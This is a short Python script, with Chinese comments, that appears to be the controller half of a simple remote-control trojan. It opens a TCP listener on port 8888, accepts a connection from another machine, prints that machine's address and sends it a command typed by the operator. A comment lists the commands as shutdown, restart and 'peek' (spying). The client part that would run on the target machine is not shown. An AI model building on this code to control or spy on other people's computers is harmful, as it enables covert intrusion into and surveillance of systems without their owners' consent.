from socket import *

S = socket() # 定义套接字

S.bind(('0.0.0.0',8888)) # 绑定ip，接口

S.listen() # 开启监听

s, u_ip = S.accept()

print(u_ip)


# 1 关机 2 重启 3 偷窥

choice = input()

s.send(choice.encode())